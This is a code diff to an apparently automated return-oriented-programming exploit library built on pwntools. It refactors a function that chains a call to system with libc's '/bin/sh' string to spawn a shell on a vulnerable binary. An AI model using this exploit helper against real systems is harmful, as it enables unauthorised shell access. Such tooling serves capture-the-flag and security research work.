@@ -1,5 +1,5 @@
 from autorop import PwnState, arutil
-from pwn import log, ROP
+from pwn import log, ROP, ELF
 
 
 def system_binsh(state: PwnState) -> PwnState:
@@ -13,8 +13,8 @@ def system_binsh(state: PwnState) -> PwnState:
 
             - ``target``: What we want to exploit.
             - ``elf``: pwntools ``ELF`` of ``state.binary_name``.
-            - ``libc``: ``ELF`` of ``target``'s libc, with ``state.libc.address``
-              already set appropriately.
+            - ``libc``: Path to ``target``'s libc.
+            - ``libc_base``: Base address of ``libc``.
             - ``vuln_function``: Name of vulnerable function in binary,
               which we can return to repeatedly.
             - ``overwriter``: Function which writes rop chain to the "right place".
@@ -22,10 +22,9 @@ def system_binsh(state: PwnState) -> PwnState:
     Returns:
         New ``PwnState``, with no property updates.
     """
-    assert state.libc is not None
-
-    rop = ROP([state.elf, state.libc])
-    arutil.align_call(rop, "system", [next(state.libc.search(b"/bin/sh\x00"))])
+    libc = arutil.load_libc(state)
+    rop = ROP([state._elf, libc])
+    arutil.align_call(rop, "system", [next(libc.search(b"/bin/sh\x00"))])
     # just in case, to allow for further exploitation
     arutil.align_call(rop, state.vuln_function, [])
     log.info(rop.dump())
